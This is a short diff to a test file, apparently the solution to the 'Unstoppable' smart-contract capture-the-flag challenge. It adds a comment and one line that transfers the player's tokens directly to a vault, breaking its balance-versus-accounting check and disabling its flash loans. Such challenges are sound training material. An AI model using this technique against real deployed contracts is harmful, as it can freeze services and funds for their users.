@@ -45,6 +45,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // sending tokens to the vault contract prevents it from being able to 
+        // execute flash loans. This is because it checks that the balance of
+        // the contract is == internal accounting
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
